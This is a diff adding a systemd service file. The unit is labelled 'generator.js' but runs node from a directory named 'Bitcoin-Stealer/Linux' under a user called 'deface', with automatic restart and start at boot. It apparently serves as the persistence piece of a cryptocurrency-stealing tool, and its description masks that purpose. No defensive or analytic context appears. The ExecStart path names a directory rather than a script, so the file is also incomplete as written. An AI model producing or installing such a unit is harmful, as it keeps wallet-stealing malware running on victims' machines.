@@ -1,0 +1,12 @@
+[Unit]
+Description=generator.js
+After=network.target
+
+[Service]
+Type=simple
+User=deface
+ExecStart=/usr/bin/node /home/deface/Bitcoin-Stealer/Linux/
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
